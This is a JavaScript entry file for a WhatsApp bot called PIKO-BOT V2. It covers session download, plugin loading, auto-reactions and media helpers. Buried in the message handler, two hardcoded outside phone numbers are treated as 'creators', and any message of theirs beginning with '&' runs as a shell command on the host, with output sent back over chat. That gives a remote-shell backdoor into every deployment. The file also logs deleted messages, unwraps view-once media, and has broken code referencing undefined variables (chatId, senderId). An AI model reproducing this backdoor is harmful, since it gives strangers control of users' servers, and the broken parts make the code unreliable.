// index.js (corrected)
// -----------------------------------------
// Main WhatsApp bot entry (fixed connection handling, store, owner number, etc.)
// -----------------------------------------

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, PhoneNumber } = require('./lib/functions') // If PhoneNumber exists there, fine; otherwise fallback handled below
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage
} = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX || '.'

// Owner number robust handling
const ownerNumber = config.OWNER_NUMBER || config.OWNER_NUM || config.OWNER || ''

// temp dir for caching
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return // don't crash
    for (const file of files) {
      try { fs.unlinkSync(path.join(tempDir, file)) } catch (e) { /* ignore */ }
    }
  })
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) console.log('Please add your session to SESSION_ID env !!')
  else {
    try {
      const sessdata = config.SESSION_ID.replace("KSMD~", '')
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) {
          console.error('Failed to download session:', err)
        } else {
          fs.writeFileSync(__dirname + '/sessions/creds.json', data)
          console.log("Session downloaded ✅")
        }
      })
    } catch (e) {
      console.error('Session fetch error:', e)
    }
  }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Create store and bind to events (you were using store but never created it)
const store = makeInMemoryStore ? makeInMemoryStore({ logger: P({ level: 'silent' }) }) : null

//=============================================
async function connectToWA() {
  try {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    const fetched = await fetchLatestBaileysVersion()
    const version = fetched?.version || (await fetchLatestBaileysVersion()).version // defensive
    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    // bind store if available
    if (store && store.bind) store.bind(conn.ev)

    conn.ev.on('connection.update', (update) => {
      const { connection, lastDisconnect } = update
      // safe check for lastDisconnect and its structure
      if (connection === 'close') {
        // use optional chaining; Boom's output.statusCode may exist
        const lastCode = lastDisconnect?.error?.output?.statusCode
        const shouldReconnect = lastCode !== DisconnectReason.loggedOut
        console.log('Connection closed. lastDisconnect code:', lastCode, 'shouldReconnect:', shouldReconnect)
        if (shouldReconnect) {
          // attempt reconnect by creating a new connection instance
          try {
            connectToWA()
          } catch (e) {
            console.error('Reconnection attempt failed:', e)
          }
        } else {
          console.log('Session logged out. Please re-scan QR or restore session.')
        }
      } else if (connection === 'open') {
        console.log('🧬 Installing Plugins')
        const pth = require('path');
        try {
          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (pth.extname(plugin).toLowerCase() == ".js") {
              require("./plugins/" + plugin);
            }
          });
          console.log('Plugins installed Successfully ✅')
        } catch (e) {
          console.error('Failed to load plugins:', e)
        }
        console.log('Bot connected to WhatsApp ✅')

        let up = `> Connected Successfully 🩷🎀 .
╭───❍「 *✅CONNECTED BOT* 」
┃ _PIKO-BOT-V2_
╰───────────❍
╭───❍「 *🌐BOT WEB PAGE* 」
┃ Comin Soon..................
╰───────────❍
╭───❍「 *🫳JOIN CHANNEL* 」
┃ Comin Soon..................
╰───────────❍
╭───❍「 *👤BOT OWNER* 」
┃ _Mr PIKO_
╰───────────❍
╭───❍「 *📈SYSTEM STATUS* 」
┃ ░░░░░░░░░░░░░░░░░░░ 100%
╰───────────❍
╭───❍「 *📍BOT PREFIX* 」
┃ _Configure Your Prefix_ ${prefix}
╰───────────❍
╭───❍「 *⚙️AUTOMATION BY* 」
┃ *PIKO-BOT V2 💸*
╰───────────❍`;
        try {
          conn.sendMessage(conn.user.id, {
            image: { url: `https://raw.githubusercontent.com/Manmitha96/BOT-PHOTOS/refs/heads/main/BotMenuPhoto/MainBotmenu.jpg` },
            caption: up
          })
        } catch (e) {
          console.error('Failed to send connected message:', e)
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

    //==============================
    conn.ev.on('messages.update', async updates => {
      // handle updates safely
      for (const update of updates) {
        try {
          if (update.update?.message == null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates).catch(e => console.error('AntiDelete error:', e))
          }
        } catch (e) {
          console.error('messages.update handler error:', e)
        }
      }
    });

    //==============================
    conn.ev.on("group-participants.update", (update) => {
      try { GroupEvents(conn, update) } catch (e) { console.error('GroupEvents error:', e) }
    });

    //=============readstatus=======
    conn.ev.on('messages.upsert', async (mek) => {
      try {
        mek = mek.messages[0]
        if (!mek || !mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
          ? mek.message.ephemeralMessage.message
          : mek.message;

        if (config.READ_MESSAGE === 'true') {
          try {
            await conn.readMessages([mek.key])
            console.log(`Marked message from ${mek.key.remoteJid} as read.`)
          } catch (e) { /* ignore read errors */ }
        }

        if (mek.message.viewOnceMessageV2)
          mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
          try { await conn.readMessages([mek.key]) } catch (e) { /* ignore */ }
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
          const jawadlike = await conn.decodeJid(conn.user.id);
          const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
          try {
            await conn.sendMessage(mek.key.remoteJid, {
              react: { text: randomEmoji, key: mek.key }
            }, { statusJidList: [mek.key.participant, jawadlike] })
          } catch (e) { /* ignore */ }
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
          const user = mek.key.participant
          const text = `${config.AUTO_STATUS_MSG || ''}`
          try {
            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
          } catch (e) { /* ignore */ }
        }

        await Promise.all([saveMessage(mek).catch(e => console.error('saveMessage err:', e))]);

        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = (type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null) ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        const isCmd = typeof body === 'string' && body.startsWith(prefix)
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = typeof body === 'string' ? body.trim().split(/ +/).slice(1) : []
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = (ownerNumber && ownerNumber.includes && ownerNumber.includes(senderNumber)) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? (groupMetadata && groupMetadata.subject) : ''
        const participants = isGroup ? (groupMetadata && groupMetadata.participants) : ''
        const groupAdmins = isGroup && participants ? await getGroupAdmins(participants) : ''

        const groupMetadata2 = await conn.groupMetadata(chatId);
            
            const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
            
            const participant2 = groupMetadata2.participants.find(p => 
                p.id === senderId || 
                p.id === senderId.replace('@s.whatsapp.net', '@lid') ||
                p.id === senderId.replace('@lid', '@s.whatsapp.net')
            );
            
            const bot = groupMetadata2.participants.find(p => 
                p.id === botId || 
                p.id === botId.replace('@s.whatsapp.net', '@lid')
            );
            
            const isBotAdmin = bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
            const isSenderAdmin = participant2 && (participant2.admin === 'admin' || participant2.admin === 'superadmin');
        
        const isBotAdmins = isGroup ? groupAdmins && groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message && m.message.reactionMessage ? true : false
        const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: mek }) }

        const udp = botNumber.split('@')[0];
        const jawadop = ['94726939427', '94756473404'];

        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8') || '[]');

        let isCreator = [udp, ...jawadop, (config.DEV || '') + '@s.whatsapp.net', ...ownerFilev2]
          .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(mek.sender);

        if (isCreator && mek.text && mek.text.startsWith("&")) {
          let code = budy.slice(2);
          if (!code) {
            reply(`Provide me with a query to run Master!`);
            return;
          }
          const { spawn } = require("child_process");
          try {
            let resultTest = spawn(code, { shell: true });
            resultTest.stdout.on("data", data => {
              reply(data.toString());
            });
            resultTest.stderr.on("data", data => {
              reply(data.toString());
            });
            resultTest.on("error", data => {
              reply(data.toString());
            });
            resultTest.on("close", code => {
              if (code !== 0) {
                reply(`command exited with code ${code}`);
              }
            });
          } catch (err) {
            reply(util.format(err));
          }
          return;
        }

        //==========public react============//
        // Auto React for all messages (public and owner)
        if (!isReact && config.AUTO_REACT === 'true') {
          const reactions = [
            '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣',
            '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕',
            '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️',
            '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑',
            '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄',
            '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀',
            '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾',
            '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟',
            '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤',
            '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪',
            '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈',
            '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚',
            '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌',
            '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫',
            '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
          ];

          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          try { m.react(randomReaction) } catch (e) { /* ignore */ }
        }

        // custum react settings
        if (!isReact && config.CUSTOM_REACT === 'true') {
          const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          try { m.react(randomReaction) } catch (e) { /* ignore */ }
        }

        //==========Sudo and Mode ============
        const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8') || '[]');
        const isBanned = bannedUsers.includes(sender);
        if (isBanned) return; // Ignore banned users completely

        const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8') || '[]');
        const ownerNumberFormatted = `${ownerNumber.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner

        // mode settings
        if (!isRealOwner && config.MODE === "private") return;
        if (!isRealOwner && isGroup && config.MODE === "inbox") return;
        if (!isRealOwner && !isGroup && config.MODE === "groups") return;

        // take commands
        const events = require('./command')
        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
          const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
          if (cmd) {
            if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
            try {
              cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } catch (e) {
              console.error("[PLUGIN ERROR] " + e)
            }
          }
        }

        events.commands.map(async (command) => {
          try {
            if (body && command.on === "body") {
              command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if (mek.q && command.on === "text") {
              command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
              command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
              command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
            }
          } catch (e) {
            console.error('Error executing mapped command:', e)
          }
        });

      } catch (e) {
        console.error('messages.upsert handler ERROR:', e)
      }
    })

    //===================================================
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user && decode.server && decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
        delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = {
          ...message.message.viewOnceMessage.message
        }
      }

      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo
          }
        } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
      // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async (message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }

      return buffer
    }

    // sendFileUrl (keeps your original but with defensive axios.head)
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      try {
        let res = await axios.head(url)
        let mime = res.headers['content-type']
        if (mime && mime.split("/")[1] === "gif") {
          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
          return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
          return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
          return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
      } catch (e) {
        console.error('sendFileUrl error:', e)
        throw e
      }
    }

    // cMod helper (unchanged)
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
        mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
        ...content,
        ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id

      return proto.WebMessageInfo.fromObject(copy)
    }

    // getFile helper (defensive)
    conn.getFile = async (PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
      let filename = path.join(__dirname, +new Date() + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
        res,
        filename,
        size: data.length,
        ...type,
        data
      }
    }

    // sendFile (keeps behavior but with guard)
    conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '', mimetype = mime, pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif.js')
        let media = { mimetype: mime, data }
        pathFile = await writeExif(media, { packname: config.PACKNAME || 'PIKO', author: config.AUTHOR || 'PIKO', categories: options.categories ? options.categories : [] })
        try { await fs.promises.unlink(filename) } catch (e) {}
        type = 'sticker'
        mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options })
      try { return fs.promises.unlink(pathFile) } catch (e) { /* ignore */ }
    }

    conn.parseMention = async (text) => {
      return [...(text || '').matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }

    conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || data.length <= 65536) {
        try { throw { json: JSON.parse(data.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '', mimetype = mime, pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif')
        let media = { mimetype: mime, data }
        pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.PACKNAME, author: options.author ? options.author : config.AUTHOR, categories: options.categories ? options.categories : [] })
        try { await fs.promises.unlink(filename) } catch (e) {}
        type = 'sticker'
        mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
      try { return fs.promises.unlink(pathFile) } catch (e) {}
    }

    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, {
      text: text,
      contextInfo: { mentionedJid: [...(text || '').matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') },
      ...options
    }, { quoted })

    conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }

    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
        text,
        footer,
        buttons,
        headerType: 2,
        ...options
      }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }

    conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      try {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
            hydratedTemplate: {
              imageMessage: message.imageMessage,
              "hydratedContentText": text,
              "hydratedFooterText": footer,
              "hydratedButtons": but
            }
          }
        }), options)
        conn.relayMessage(jid, template.message, { messageId: template.key.id })
      } catch (e) {
        console.error('send5ButImg error:', e)
      }
    }

    conn.getName = (jid, withoutContact = false) => {
      // safer implementation: resolve from store contact or return jid
      try {
        let id = conn.decodeJid(jid)
        if (id.endsWith('@g.us')) {
          // group: try group metadata
          const gm = store?.contacts?.[id] || {}
          const subject = gm.subject || gm.subject
          return (withoutContact ? '' : gm.name) || gm.subject || id
        } else {
          const v = store?.contacts?.[id] || {}
          // fallback to v.name or jid
          return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || id
        }
      } catch (e) {
        return jid
      }
    };

    // Vcard Functionality (keeps same structure)
    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
      let list = [];

      for (let i of kon) {
        const name = await conn.getName(i + '@s.whatsapp.net');

        list.push({
          displayName: name,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${name}
FN:${config.OWNER_NAME || ''}
item1.TEL;waid=${i}:${i}
item1.X-ABLabel:Click here to chat
item2.EMAIL;type=INTERNET:${config.EMAIL || ''}
item2.X-ABLabel:Email
item3.URL:https://github.com/${config.GITHUB || ''}
item3.X-ABLabel:GitHub
item4.ADR:;;${config.LOCATION || ''};;;;
item4.X-ABLabel:Region
END:VCARD`,
        });
      }

      await conn.sendMessage(jid, {
        contacts: { displayName: `${list.length} Contact`, contacts: list },
        ...opts
      }, { quoted })
    };

    conn.setStatus = status => {
      conn.query({
        tag: 'iq',
        attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
        content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }]
      })
      return status;
    };

    conn.serializeM = (m) => sms(conn, m, store)
    // return/resolve connection for any external usage
    return conn
  } catch (err) {
    console.error('connectToWA error:', err)
    // do not throw: allow process to continue or restart externally
  }
}

app.get("/", (req, res) => {
  res.send("PIKO-BOT V-2 STARTED NOW SAFELY ✅");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
  connectToWA()
}, 4000);
